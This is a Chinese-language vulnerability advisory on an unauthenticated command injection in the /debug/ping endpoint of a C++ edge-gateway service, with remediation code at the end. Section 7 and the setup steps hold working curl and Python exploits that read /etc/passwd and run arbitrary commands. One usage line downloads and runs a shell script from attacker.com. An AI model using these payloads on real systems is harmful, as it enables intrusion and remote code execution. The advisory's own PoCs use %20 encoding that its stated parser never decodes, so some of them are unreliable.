# VULN-DF-DIAG-001: 诊断模块 pingHost 函数通过 popen() 执行未过滤的用户输入，导致远程 OS 命令注入

**严重性**: Critical | **CWE**: CWE-78 (OS Command Injection) | **置信度**: 85/100
**位置**: `src/diagnostics.cpp:8-12` @ `Diagnostics::pingHost`

---

## 1. 漏洞细节

`Diagnostics::pingHost()` 函数接收一个 `host` 字符串参数，并将其直接拼接到 shell 命令 `"ping -c 1 " + host` 中，随后通过 `popen()` 执行。`popen()` 内部调用 `/bin/sh -c` 来解析和执行命令字符串，这意味着攻击者可以通过 shell 元字符（`;`、`$()`、`` ` ``、`&&`、`||`、`|`）注入任意操作系统命令。

该函数的 `host` 参数来源于 HTTP POST 请求 `/debug/ping` 的查询参数 `host`。完整的数据流路径为：

1. `recv()` 从 TCP 套接字接收原始 HTTP 请求数据（`http_server.cpp:113`）
2. `parseRequest()` 解析 HTTP 请求，通过 `parseQuery()` 提取查询参数（`http_server.cpp:42-53`）
3. 路由分发到 `POST /debug/ping` 的 lambda 处理函数（`main.cpp:64`）
4. `queryValue(request, "host")` 从查询参数中提取 `host` 值（`main.cpp:65`）
5. 直接将 `host` 传递给 `diagnostics.pingHost(host)`（`main.cpp:67`）
6. `pingHost()` 内部执行字符串拼接并调用 `popen()`（`diagnostics.cpp:8,12`）

**整条链路中没有任何环节对输入进行验证、过滤或转义。** 该端点也没有任何认证机制，任何能够访问 8080 端口的网络用户均可直接触发此漏洞。

## 2. 漏洞代码

**文件**: `src/diagnostics.cpp` (行 7-22)

```cpp
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;  // ← 漏洞根因：未过滤的用户输入直接拼接
  std::array<char, 256> buffer {};
  std::ostringstream output;

  FILE* pipe = popen(command.c_str(), "r");  // ← SINK：通过 /bin/sh -c 执行拼接后的命令
  if (!pipe) {
    return "failed to start diagnostic command\n";
  }

  while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
    output << buffer.data();
  }
  pclose(pipe);
  return output.str();
}
```

**漏洞根因分析**：

- **第 8 行**：`"ping -c 1 " + host` — 将外部不可信输入直接拼接到 shell 命令字符串中，没有任何转义或验证。如果 `host` 包含 `;cat /etc/passwd`，最终命令变为 `ping -c 1 ;cat /etc/passwd`。
- **第 12 行**：`popen(command.c_str(), "r")` — `popen()` 会调用 `/bin/sh -c` 来执行命令，shell 会解析所有元字符并执行注入的命令。注入的命令以运行该服务的系统用户权限执行。

**调用方代码** (`src/main.cpp` 行 64-68)：

```cpp
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
  std::string host = queryValue(request, "host");  // 直接从查询参数提取，无验证
  audit.event("operator", "debug-ping", host);     // 仅记录审计日志，未做安全检查
  return text(200, diagnostics.pingHost(host));    // 直接传递给漏洞函数
});
```

**查询参数解析** (`src/http_server.cpp` 行 19-32)：

```cpp
std::map<std::string, std::string> parseQuery(const std::string& query) {
  std::map<std::string, std::string> result;
  std::stringstream stream(query);
  std::string item;
  while (std::getline(stream, item, '&')) {
    auto pos = item.find('=');
    if (pos == std::string::npos) {
      result[item] = "";
    } else {
      result[item.substr(0, pos)] = item.substr(pos + 1);  // 原样提取值，无清洗
    }
  }
  return result;
}
```

## 3. 完整攻击链路

```
[网络入口] recv()@src/http_server.cpp:113
  ↓ TCP 数据流，原始 HTTP 请求（包含恶意 host 参数）
[HTTP 解析] parseRequest()@src/http_server.cpp:42
  ↓ 解析请求行，提取 URL 路径和查询字符串
[参数解析] parseQuery()@src/http_server.cpp:19
  ↓ 按 '&' 和 '=' 分割查询字符串，无 URL 解码，无输入清洗
[路由分发] handlers_.find()@src/http_server.cpp:120
  ↓ 匹配 "POST /debug/ping" 路由，调用对应 handler
[参数提取] queryValue(request, "host")@src/main.cpp:65
  ↓ 从已解析的 query map 中取出 host 值，无任何验证
[漏洞函数] Diagnostics::pingHost(host)@src/diagnostics.cpp:7
  ↓ 字符串拼接: "ping -c 1 " + host
[命令执行] popen(command.c_str(), "r")@src/diagnostics.cpp:12
  ↓ /bin/sh -c 执行拼接后的命令，shell 解析元字符并执行注入命令
[结果返回] fgets() → output.str() → HTTP 响应体
  ↓ 注入命令的输出通过 HTTP 响应返回给攻击者
```

**链路详细说明**：

1. **`recv()` (http_server.cpp:113)**：服务器监听 `INADDR_ANY:8080`，从 TCP 套接字接收最多 4095 字节的原始数据。攻击者发送的 HTTP 请求在此进入系统。
2. **`parseRequest()` (http_server.cpp:42)**：解析 HTTP 请求行，分离 URL 路径和查询字符串。查询字符串部分传递给 `parseQuery()`。
3. **`parseQuery()` (http_server.cpp:19)**：简单的字符串分割，将 `host=<payload>` 原样提取为键值对。**不进行 URL 解码**（这意味着攻击者需要在 HTTP 请求中直接包含元字符，或使用 URL 编码后由其他组件解码——但此处不解码反而意味着攻击者需要发送原始字符）。
4. **`queryValue()` (main.cpp:13-16)**：从 map 中查找 key，直接返回 value，无验证。
5. **`pingHost()` (diagnostics.cpp:7-22)**：将 host 拼接到命令字符串，通过 `popen()` 执行。`popen()` 内部 `fork()` 子进程并 `exec("/bin/sh", "-c", command)`，shell 会完整解析命令字符串中的所有元字符。

## 4. 攻击场景

**攻击者画像**: 远程未认证用户。任何能够与目标服务器 8080 端口建立 TCP 连接的攻击者均可利用此漏洞，无需任何身份凭证或特殊权限。

**攻击向量**: 通过 HTTP POST 请求的 URL 查询参数注入恶意 shell 命令。攻击者只需发送一个标准的 HTTP 请求即可触发。

**利用难度**: **低** — 无需绕过任何安全机制，无需特殊的利用技术，只需构造包含 shell 元字符的 HTTP 请求。

### 攻击步骤

1. **发现目标**：攻击者扫描网络，发现目标服务器的 8080 端口开放
2. **识别端点**：通过目录枚举或源码泄露，发现 `/debug/ping` 端点
3. **构造恶意请求**：在 `host` 查询参数中注入 shell 元字符和恶意命令
4. **发送请求**：向 `POST /debug/ping?host=<payload>` 发送 HTTP 请求
5. **获取结果**：注入命令的执行结果通过 HTTP 响应体返回给攻击者
6. **扩大战果**：利用命令执行权限进行信息收集、权限提升、横向移动等后续攻击

## 5. 攻击条件

| 条件类型   | 要求             | 说明                                                                                       |
| ---------- | ---------------- | ------------------------------------------------------------------------------------------ |
| 网络可达性 | TCP 8080 端口可达 | 服务器绑定 `INADDR_ANY:8080`（http_server.cpp:92-93），监听所有网络接口，攻击者需能访问该端口 |
| 认证要求   | 无               | `/debug/ping` 端点没有任何认证中间件或 token 验证，直接可访问                                |
| 配置依赖   | 无               | 漏洞代码在默认编译配置下即存在，无需特殊编译选项或运行时配置                                  |
| 环境依赖   | 存在 `/bin/sh`   | `popen()` 依赖 `/bin/sh`，这在几乎所有 Linux/Unix 系统上都存在                              |
| 时序条件   | 无               | 不存在竞态条件，请求按顺序处理，攻击可随时发起                                                |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                               |
| -------- | ---- | -------------------------------------------------------------------------------------------------- |
| 机密性   | **高** | 攻击者可读取服务器上的任意文件（如 `/etc/passwd`、应用配置、密钥文件），读取环境变量和进程信息       |
| 完整性   | **高** | 攻击者可写入/修改任意文件，篡改应用数据，安装后门，修改系统配置                                     |
| 可用性   | **高** | 攻击者可终止服务进程（`kill`），删除关键文件，耗尽系统资源，导致服务完全不可用                       |

**影响范围**: 以运行 `edge-gateway` 进程的系统用户权限为边界。如果服务以 root 权限运行（在某些部署场景中常见），攻击者将获得完整的系统控制权。即使以普通用户运行，攻击者也可在该用户权限范围内执行任意操作，并可能通过本地提权漏洞进一步扩大影响。

**CVSS 3.1 评分估算**: **9.8 (Critical)**
- 攻击向量 (AV): Network
- 攻击复杂度 (AC): Low
- 所需权限 (PR): None
- 用户交互 (UI): None
- 影响范围 (S): Unchanged
- 机密性 (C): High
- 完整性 (I): High
- 可用性 (A): High
- 向量字符串: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权对他人系统进行测试属于违法行为。

### PoC 1: 使用 curl 读取 /etc/passwd

```bash
# 读取系统密码文件
curl -X POST "http://<TARGET_IP>:8080/debug/ping?host=;cat%20/etc/passwd"
```

**预期输出**: HTTP 响应体中包含 `/etc/passwd` 文件内容。

### PoC 2: 使用 curl 执行 id 命令

```bash
# 查看当前用户身份
curl -X POST "http://<TARGET_IP>:8080/debug/ping?host=;id"
```

**预期输出**: HTTP 响应体中包含类似 `uid=1000(user) gid=1000(user) groups=1000(user)` 的信息。

### PoC 3: Python 自动化利用脚本

```python
#!/usr/bin/env python3
"""
VULN-DF-DIAG-001 PoC - OS Command Injection in Diagnostics::pingHost
仅供安全测试和验证使用
"""
import sys
import urllib.request
import urllib.parse

def exploit(target, command):
    """通过 /debug/ping 端点注入并执行任意 shell 命令"""
    payload = f";{command}"
    url = f"http://{target}:8080/debug/ping?host={urllib.parse.quote(payload)}"
    
    req = urllib.request.Request(url, method='POST', data=b'')
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = resp.read().decode('utf-8', errors='replace')
            print(f"[+] 命令执行结果:\n{result}")
            return result
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <目标IP> <命令>")
        print(f"示例: {sys.argv[0]} 192.168.1.100 'cat /etc/passwd'")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2]
    exploit(target, command)
```

**使用说明**:

```bash
python3 poc.py 192.168.1.100 "cat /etc/passwd"
python3 poc.py 192.168.1.100 "id"
python3 poc.py 192.168.1.100 "ls -la /"
python3 poc.py 192.168.1.100 "wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh"
```

### PoC 4: 使用原始 TCP 套接字（无需 curl）

```python
#!/usr/bin/env python3
"""原始 TCP PoC - 不依赖 HTTP 客户端库"""
import socket

target = "192.168.1.100"
port = 8080
payload = ";cat /etc/passwd"

request = (
    f"POST /debug/ping?host={payload} HTTP/1.1\r\n"
    f"Host: {target}:{port}\r\n"
    f"Content-Length: 0\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target, port))
sock.send(request.encode())

response = b""
while True:
    chunk = sock.recv(4096)
    if not chunk:
        break
    response += chunk
sock.close()

print(response.decode('utf-8', errors='replace'))
```

**预期结果**: 所有 PoC 触发后，HTTP 响应体中将包含注入命令的执行输出。对于 `cat /etc/passwd`，响应中将出现类似 `root:x:0:0:root:/root:/bin/bash` 的系统用户信息。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Ubuntu 20.04/22.04 LTS 或任何支持 C++17 编译的 Linux 发行版
- **编译器**: GCC 9+ 或 Clang 10+（需支持 C++17 标准）
- **构建工具**: CMake 3.16+
- **依赖**: 无外部依赖，仅使用标准库和 POSIX API

### 构建步骤

```bash
# 克隆或获取项目源码
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置 CMake（默认构建，不启用任何安全加固以便复现）
cmake ..

# 编译
make -j$(nproc)

# 可执行文件位于 build/edge-gateway
```

### 运行配置

```bash
# 启动服务（默认监听 8080 端口）
./build/edge-gateway

# 或指定其他端口
./build/edge-gateway 9090
```

### 验证步骤

1. **启动目标服务**：
   ```bash
   ./build/edge-gateway &
   ```

2. **验证服务正常运行**：
   ```bash
   curl http://localhost:8080/health
   # 预期输出: ok
   ```

3. **触发漏洞 — 执行 id 命令**：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=;id"
   ```

4. **触发漏洞 — 读取敏感文件**：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=;cat%20/etc/passwd"
   ```

5. **触发漏洞 — 列出目录**：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=;ls%20-la%20/"
   ```

6. **触发漏洞 — 使用命令替换语法**：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=%24(id)"
   ```

### 预期结果

- 步骤 3 的响应中将包含 `uid=XXXX(...)` 格式的当前用户身份信息
- 步骤 4 的响应中将包含 `/etc/passwd` 文件的完整内容
- 步骤 5 的响应中将包含根目录的文件列表
- 步骤 6 的响应中将包含 `id` 命令的输出

所有响应均为 HTTP 200，命令输出直接嵌入在响应体中（`ping` 命令本身的输出和注入命令的输出混合在一起）。

## 9. 修复建议

### 方案 1: 使用安全的 API 替代 popen()（推荐）

```cpp
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

std::string Diagnostics::pingHost(const std::string& host) const {
    // 验证 host 格式：仅允许合法主机名或 IP 地址
    static const std::regex validHost(R"([a-zA-Z0-9]([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?)");
    if (!std::regex_match(host, validHost)) {
        return "invalid host format\n";
    }

    int pipefd[2];
    if (pipe(pipefd) == -1) return "pipe failed\n";

    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]); close(pipefd[1]);
        return "fork failed\n";
    }

    if (pid == 0) {
        // 子进程：使用 execvp 避免 shell 解析
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);
        execlp("ping", "ping", "-c", "1", host.c_str(), nullptr);
        _exit(127);
    }

    // 父进程
    close(pipefd[1]);
    std::ostringstream output;
    char buffer[256];
    ssize_t n;
    while ((n = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
        output.write(buffer, n);
    }
    close(pipefd[0]);
    waitpid(pid, nullptr, 0);
    return output.str();
}
```

**关键改进**：
- 使用 `fork()` + `execlp()` 替代 `popen()`，避免 shell 解析元字符
- 添加主机名格式验证（正则白名单）
- 参数作为独立 argv 传递，不会被 shell 解释

### 方案 2: 输入验证 + 白名单（最小改动）

```cpp
std::string Diagnostics::pingHost(const std::string& host) const {
    // 严格白名单：仅允许字母、数字、点、短横线
    for (char c : host) {
        if (!std::isalnum(c) && c != '.' && c != '-' && c != ':') {
            return "invalid host: contains disallowed characters\n";
        }
    }
    if (host.empty() || host.size() > 253) {
        return "invalid host length\n";
    }
    // ... 原有 popen 逻辑（此时已相对安全）
}
```

### 方案 3: 移除调试端点（如果不需要）

直接从 `main.cpp` 中删除 `/debug/ping` 路由注册，消除攻击面。

### 额外安全措施

- 为 `/debug/*` 端点添加认证和授权机制
- 限制调试端点仅允许从特定 IP 地址访问
- 以最小权限用户运行服务（非 root）
- 启用编译器安全选项：`-fstack-protector-strong`、`-D_FORTIFY_SOURCE=2`、`-pie -fPIE`
